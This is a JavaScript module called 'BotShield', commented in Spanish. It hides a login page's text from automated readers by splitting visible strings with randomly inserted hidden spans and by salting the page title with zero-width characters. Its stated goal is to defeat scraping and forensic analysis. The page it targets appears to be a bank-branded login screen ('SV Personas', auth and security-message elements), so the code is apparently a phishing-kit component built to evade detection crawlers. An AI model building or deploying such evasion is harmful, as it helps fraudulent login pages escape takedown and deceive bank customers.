/**
 * BotShield - Módulo de Ofuscación Anti-Bot y Seguridad
 * Implementa técnicas de confusión para evitar el raspado de datos y análisis forense.
 */
const BotShield = (function() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    
    /**
     * Genera una cadena aleatoria corta.
     */
    function getRandomString(length) {
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    /**
     * Ofusca una cadena de texto insertando spans ocultos.
     * @param {string} text Texto a ofuscar.
     * @returns {string} HTML con spans ocultos.
     */
    function obfuscateText(text) {
        if (!text || text.length < 3) return text;
        
        let result = '';
        let i = 0;
        while (i < text.length) {
            // Fragmentos de 2 a 4 caracteres
            let chunkSize = Math.floor(Math.random() * 3) + 2;
            result += text.substring(i, i + chunkSize);
            i += chunkSize;
            
            if (i < text.length) {
                const randomText = getRandomString(3);
                // Alternar entre display:none y display:none;font-size:0
                const style = Math.random() > 0.5 ? 'display:none' : 'display:none;font-size:0';
                result += `<span style="${style}">${randomText}</span>`;
            }
        }
        return result;
    }

    /**
     * Ofusca el contenido de un elemento seleccionado.
     * @param {string} selector Selector CSS del elemento.
     */
    function obfuscateElement(selector) {
        const elements = document.querySelectorAll(selector);
        elements.forEach(el => {
            if (el.children.length === 0 && el.textContent.trim().length > 0) {
                el.innerHTML = obfuscateText(el.textContent.trim());
            }
        });
    }

    /**
     * Establece el título de la página de forma ofuscada (Regla 16.1 mejorada)
     * Para el título se usan caracteres invisibles (\u200B) para evitar que se vea el código
     * en la pestaña del navegador, cumpliendo con la confusión anti-bot.
     * @param {string} text Título a establecer.
     */
    function setObfuscatedTitle(text) {
        if (!text) return;
        const invisibleChar = '\u200B'; // Zero-width space (invisible para humanos, basura para bots)
        let obfuscated = '';
        for (let i = 0; i < text.length; i++) {
            // Inserta el carácter invisible aleatoriamente entre caracteres reales
            obfuscated += text[i] + (Math.random() > 0.6 ? invisibleChar : '');
        }
        document.title = obfuscated;
    }

    /**
     * Aplica ofuscación a todos los elementos sensibles predefinidos.
     */
    function obfuscateAll(titleText = 'SV Personas') {
        // Establecer título (Regla 16.1)
        setObfuscatedTitle(titleText);

        // Títulos de login y sucursal
        obfuscateElement('h1');
        obfuscateElement('.bc-card-auth-title');
        obfuscateElement('.bc-card-auth-description');
        
        // Labels (solo labels visibles)
        obfuscateElement('label');
        
        // Mensajes de error y modales
        obfuscateElement('.bc-alert-title');
        obfuscateElement('.bc-alert-text');
        obfuscateElement('.bc-inline-alert-title');
        obfuscateElement('.bc-inline-alert-text');
        
        // Títulos de modales
        obfuscateElement('[title]'); // Atributos de título en componentes custom
        obfuscateElement('.bc-modal-title');
        
        // Mensajes de seguridad
        obfuscateElement('.security-message');
        obfuscateElement('.bc-text-break');
    }

    return {
        obfuscateText,
        obfuscateElement,
        setObfuscatedTitle,
        obfuscateAll
    };
})();

// Aplicación automática si se desea (Regla 16.7)
// document.addEventListener('DOMContentLoaded', () => {
//    BotShield.obfuscateAll();
// });
